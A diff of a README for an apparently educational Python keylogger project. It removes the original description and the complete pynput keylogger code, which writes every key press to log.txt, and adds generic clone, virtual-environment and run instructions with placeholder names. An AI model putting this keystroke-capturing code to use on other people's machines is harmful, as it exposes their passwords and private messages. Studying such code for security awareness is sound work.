@@ -1,25 +1,27 @@
-# Basic-Keylogger-Educational-Project-
-An educational Python-based keylogger built to understand how keystroke logging works at a low level. Developed strictly for learning, ethical security research, and defensive cybersecurity awareness.
-from pynput.keyboard import Listener
+About The Project
+A simple keylogger built using Python and the pynput library to demonstrate keyboard event handling and file I/O.
 
+Getting Started
+Prerequisites
+Python 3.x
+pip (Python package installer)
+Installation & Usage
+Clone the repository:
 
-def write_to_file(key):
-    letter = str(key)
-    letter = letter.replace("'", "")
+git clone [https://github.com/your-username/your-repo-name.git](https://github.com/your-username/your-repo-name.git)
+cd your-repo-name
+(Recommended) Create and activate a virtual environment:
 
-    if letter == 'Key.space':
-        letter = ' '
-    if letter == 'Key.shift_r':
-        letter = ''
-    if letter == "Key.ctrl_l":
-        letter = ""
-    if letter == "Key.enter":
-        letter = "\n"
+# For Windows
+python -m venv venv
+.\venv\Scripts\activate
 
-    with open("log.txt", 'a') as f:
-        f.write(letter)
+# For macOS/Linux
+python3 -m venv venv
+source venv/bin/activate
+Install the required packages:
 
-# Collecting events until stopped
+pip install -r requirements.txt
+Run the main script:
 
-with Listener(on_press=write_to_file) as l:
-    l.join()
+python your_main_script_name.py
